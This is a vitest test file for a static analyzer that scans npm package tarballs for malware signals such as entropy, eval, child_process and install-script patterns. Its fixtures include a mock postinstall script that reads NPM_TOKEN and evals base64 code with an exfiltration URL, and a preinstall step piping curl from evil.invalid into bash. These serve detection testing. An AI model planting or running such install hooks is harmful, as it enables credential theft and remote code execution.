import zlib from 'node:zlib';
import tar from 'tar-stream';
import { describe, it, expect } from 'vitest';
import { StaticAnalyzer, calculateEntropy } from './static-analyzer.js';
import type { ScanContext } from '../types.js';

function createMockTarball(files: Record<string, string>): Buffer {
  const pack = tar.pack();
  for (const [name, content] of Object.entries(files)) {
    pack.entry({ name: `package/${name}` }, content);
  }
  pack.finalize();
  const chunks: Buffer[] = [];
  return new Promise((resolve) => {
    pack.on('data', (c) => chunks.push(c));
    pack.on('end', () => {
      const tarBuf = Buffer.concat(chunks);
      resolve(zlib.gzipSync(tarBuf));
    });
  }) as unknown as Buffer;
}

describe('StaticAnalyzer & TarballExtractor', () => {
  it('calculates Shannon entropy correctly', () => {
    expect(calculateEntropy('')).toBe(0);
    expect(calculateEntropy('aaaaaa')).toBe(0);
    // Random / diverse string has high entropy
    const high = calculateEntropy('abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=');
    expect(high).toBeGreaterThan(4.0);
  });

  it('keeps single signals at LOW severity and low confidence (e.g. benign child_process)', async () => {
    const tarball = await createMockTarball({
      'index.js': 'const cp = require("child_process"); cp.exec("ls");',
    });

    const scanner = new StaticAnalyzer();
    const ctx: ScanContext = {
      packageName: 'benign-tool',
      ecosystem: 'npm',
      version: '1.0.0',
      tarballBytes: tarball,
    };

    const evidence = await scanner.collect(ctx);
    expect(evidence.length).toBe(1);
    expect(evidence[0].category).toBe('static-analysis');
    expect(evidence[0].severity).toBe('LOW');
    expect(evidence[0].confidence).toBe(0.4);
    expect(evidence[0].description).toContain('child_process');
  });

  it('downgrades signals in test files to INFO with very low confidence', async () => {
    const tarball = await createMockTarball({
      'test/index.spec.js': 'eval("1 + 1");',
    });

    const scanner = new StaticAnalyzer();
    const ctx: ScanContext = {
      packageName: 'test-pkg',
      ecosystem: 'npm',
      version: '1.0.0',
      tarballBytes: tarball,
    };

    const evidence = await scanner.collect(ctx);
    expect(evidence.length).toBe(1);
    expect(evidence[0].severity).toBe('INFO');
    expect(evidence[0].confidence).toBe(0.2);
  });

  it('escalates correlated signals in lifecycle install script (env + obfuscation + network) to CRITICAL with 0.98 confidence', async () => {
    const maliciousScript = `
      const token = process.env.NPM_TOKEN;
      const b64 = "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkwQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejEyMzQ1Njc4OTA=";
      const url = "http://exfil.invalid/leak";
      eval(Buffer.from(b64, "base64").toString());
    `;

    const tarball = await createMockTarball({
      'scripts/postinstall.js': maliciousScript,
    });

    const scanner = new StaticAnalyzer();
    const ctx: ScanContext = {
      packageName: 'event-stream-lite',
      ecosystem: 'npm',
      version: '1.0.1',
      tarballBytes: tarball,
      registryMetadata: {
        versions: {
          '1.0.1': {
            scripts: {
              postinstall: 'node ./scripts/postinstall.js',
            },
          },
        },
      },
    };

    const evidence = await scanner.collect(ctx);
    expect(evidence.length).toBe(1);
    expect(evidence[0].severity).toBe('CRITICAL');
    expect(evidence[0].confidence).toBe(0.98);
    expect(evidence[0].description).toContain('Correlated credential exfiltration pattern');
    expect(evidence[0].dedupKey).toContain('static:correlated:exfiltration:scripts/postinstall.js');
  });

  it('flags install script curl pipe sh pattern', async () => {
    const tarball = await createMockTarball({
      'index.js': 'module.exports = {};',
    });

    const scanner = new StaticAnalyzer();
    const ctx: ScanContext = {
      packageName: 'pipe-sh-pkg',
      ecosystem: 'npm',
      version: '1.0.0',
      tarballBytes: tarball,
      registryMetadata: {
        versions: {
          '1.0.0': {
            scripts: {
              preinstall: 'curl -s http://evil.invalid/setup.sh | bash',
            },
          },
        },
      },
    };

    const evidence = await scanner.collect(ctx);
    expect(evidence.some((e) => e.description.includes('pipes remote curl/wget download directly to shell'))).toBe(true);
  });
});
